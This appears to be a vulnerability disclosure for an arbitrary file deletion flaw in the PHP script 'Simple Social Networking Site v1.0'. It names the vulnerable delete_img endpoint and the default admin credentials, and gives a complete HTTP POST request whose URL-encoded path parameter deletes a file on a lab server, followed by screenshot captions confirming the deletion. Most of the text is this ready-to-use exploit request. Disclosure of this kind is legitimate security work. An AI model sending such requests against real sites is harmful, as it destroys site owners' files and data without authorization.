# Simple Social Networking Site v1.0 by oretnom23 has Delete any file

vendors: https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Vulnerability File: /sns/classes/Master.php?f=delete_img

Vulnerability location: /sns/classes/Master.php?f=delete_img, path

The password for the backend login account is: admin/admin123

Payload:

Here we delete the shel.php file in the root directory

```sql
POST /sns/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/sns/admin/?page=system_info
Content-Length: 62
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Fsns%2Fadmin%2Fshell.php
```

The file path needs to be encoded by url

![image](https://user-images.githubusercontent.com/54017627/166924905-d7459282-fc4b-45a8-84ee-b29c5aac6f71.png)

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the admin directory of the website

![image](https://user-images.githubusercontent.com/54017627/166925010-aad1c78d-815d-48fb-8e39-a2aeadbbb1fb.png)

The response package shows that the deletion was successful. Let's go to the root directory to see if the shell.php file still exists.

![image](https://user-images.githubusercontent.com/54017627/166926218-141f0ee0-f86f-43a5-92aa-6af2a29a7269.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/166926180-2503631c-a296-4232-859c-de8db7c4e29e.png)
